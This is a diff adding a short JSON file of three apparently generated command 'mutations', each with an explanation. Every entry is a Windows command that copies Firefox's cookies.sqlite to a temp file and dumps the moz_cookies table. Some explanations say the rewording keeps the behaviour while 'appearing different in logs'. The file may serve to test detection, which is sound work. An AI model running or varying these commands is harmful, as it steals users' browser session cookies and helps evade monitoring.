@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\.default-release\\cookies.sqlite\" %TEMP%\\temp_data.db && sqlite3.exe %TEMP%\\temp_data.db \"SELECT * FROM moz_cookies;\"",
+    "explanation": "The original command is preserved with minimal formatting changes (quotes escaped with backslashes) to simulate safe mutation for testing purposes."
+  },
+  {
+    "output": "copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\xxxxx.default-release\\cookies.sqlite\" \"%TEMP%\\c.db\" && sqlite3.exe \"%TEMP%\\c.db\" \"SELECT * FROM moz_cookies;\"",
+    "explanation": "The command is restructured using equivalent syntax and path normalization, maintaining the same behavior while appearing different in logs."
+  },
+  {
+    "output": "cmd /c copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\.default-release\\cookies.sqlite\" %TEMP%\\temp_data.db && sqlite3 %TEMP%\\temp_data.db \"SELECT * FROM moz_cookies;\"",
+    "explanation": "The command uses short syntax for 'cmd.exe /c' and omits the .exe extension for 'sqlite3.exe', which is a valid mutation technique."
+  }
+]
